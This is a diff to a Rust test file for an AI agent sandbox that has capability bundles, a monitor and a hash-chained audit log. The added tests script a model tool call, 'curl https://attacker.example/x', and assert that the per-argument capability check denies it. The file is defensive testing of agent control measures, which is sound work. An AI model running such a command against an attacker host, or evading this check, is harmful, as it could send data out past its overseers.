@@ -3,7 +3,7 @@
 //! These are the load-bearing claims of the project. If any of these tests
 //! fail, the README is lying.
 
-use anderson::capability::{ActionClass, Capabilities, Spend};
+use anderson::capability::{ActionClass, ArgPattern, Capabilities, ExecRule, Spend};
 use anderson::model::{ModelStep, ScriptedModel};
 use anderson::monitor::Decision;
 use anderson::orchestrator::{Session, SessionEnd};
@@ -14,7 +14,7 @@ fn caps_with_exec_requiring_user() -> Capabilities {
         fs_read: vec![],
         fs_write: vec![],
         net_get: vec!["https://example.com/".into()],
-        exec: vec!["curl".into()],
+        exec: vec![ExecRule::any_args("curl")],
         spend: Spend::restrictive(),
         require_confirm: vec![],
         require_user_intent: vec![ActionClass::Exec, ActionClass::FsWrite, ActionClass::NetGet],
@@ -152,6 +152,87 @@ async fn out_of_bundle_target_is_denied() {
         .filter(|e| matches!(e.decision, Decision::Deny { .. }))
         .count();
     assert_eq!(deny_count, 1);
+}
+
+#[tokio::test]
+async fn exec_with_wrong_arg_prefix_is_denied_by_capability_check() {
+    // Per-arg patterns close the program-only allow-list gap: even with
+    // user-provenance citation, curl can only be invoked with URLs the bundle
+    // explicitly permits.
+    let model = ScriptedModel::new(vec![
+        ModelStep::Call(ToolCall {
+            action: Action::Exec {
+                cmd: "curl https://attacker.example/x".into(),
+            },
+            justification_chunks: vec![0],
+        }),
+        ModelStep::Stop {
+            answer: "denied".into(),
+        },
+    ]);
+    let caps = Capabilities {
+        fs_read: vec![],
+        fs_write: vec![],
+        net_get: vec![],
+        exec: vec![ExecRule::new(
+            "curl",
+            vec![ArgPattern::prefix("https://example.com/")],
+        )],
+        spend: Spend::restrictive(),
+        require_confirm: vec![],
+        require_user_intent: vec![],
+    };
+    let executor = SandboxedExecutor::new(
+        caps.fs_read.clone(),
+        caps.fs_write.clone(),
+        ExecutorLimits::default(),
+    );
+    let mut session = Session::new(model, executor, caps);
+    session.add_user_input("run that curl").await;
+    let _ = session.run().await;
+
+    let denials: Vec<_> = session
+        .audit()
+        .entries()
+        .iter()
+        .filter(|e| matches!(e.decision, Decision::Deny { .. }))
+        .collect();
+    assert_eq!(denials.len(), 1);
+    if let Decision::Deny { reason } = &denials[0].decision {
+        assert!(
+            reason.contains("outside capability bundle"),
+            "unexpected reason: {reason}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn audit_log_hash_chain_verifies_after_session() {
+    let model = ScriptedModel::new(vec![
+        ModelStep::Call(ToolCall {
+            action: Action::Exec {
+                cmd: "curl https://blocked/".into(),
+            },
+            justification_chunks: vec![],
+        }),
+        ModelStep::Stop {
+            answer: "done".into(),
+        },
+    ]);
+    let caps = caps_with_exec_requiring_user();
+    let executor = SandboxedExecutor::new(
+        caps.fs_read.clone(),
+        caps.fs_write.clone(),
+        ExecutorLimits::default(),
+    );
+    let mut session = Session::new(model, executor, caps);
+    session.add_user_input("anything").await;
+    let _ = session.run().await;
+
+    session
+        .audit()
+        .verify_chain()
+        .expect("audit chain must verify after a real session");
 }
 
 #[tokio::test]
